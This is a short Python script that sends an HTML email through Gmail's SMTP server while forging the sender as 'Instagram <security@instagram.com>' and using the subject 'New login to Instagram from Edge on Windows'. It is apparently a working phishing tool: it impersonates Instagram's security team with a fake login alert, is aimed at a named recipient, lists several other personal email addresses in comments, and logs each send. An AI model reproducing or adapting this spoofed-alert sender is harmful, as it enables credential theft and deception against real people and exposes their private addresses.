import smtplib
from secrets import password
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
from email.utils import make_msgid

if __name__ == '__main__':

    username = 'instagram.authorization.service@gmail.com'
    # username = 'lightkrg@gmail.com'

    fake_from = 'security@instagram.com'
    fake_name = 'Instagram'

    # to_email = 'instagram.authorization.service@gmail.com'
    # to_email = 'dilya17082004@gmail.com'
    # to_email = 'erkeesentaeva1@gmail.com'
    # to_email = 'lightkrg@gmail.com'
    to_email = 'lumieny@gmail.com'
    # to_email = 'a.ordayev@gmail.com'
    # to_email = 'msmegap@gmail.com'
    to_name = 'Adil Ordayev'

    subject = 'New login to Instagram from Edge on Windows'
    with open('mail.html', 'r', encoding='utf-8') as f:
        html = f.read()

    # content = 'test'

    msg = MIMEMultipart('alternative')
    content = MIMEText(html, 'html')
    msg.attach(content)
    msg['Subject'] = subject
    msg['From'] = f'{fake_name} <{fake_from}>'
    msg['To'] = f'{to_name} <{to_email}>'
    msg['Message-ID'] = make_msgid()

    # print(msg)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(username, to_email, msg.as_string())
    server.close()
    
    now = datetime.now()
    with open('log.txt', 'a', encoding='utf-8') as logger:
        logger.write(f'{now.strftime("%d-%m-%Y %H:%M:%S")}\t\t{to_email}\n')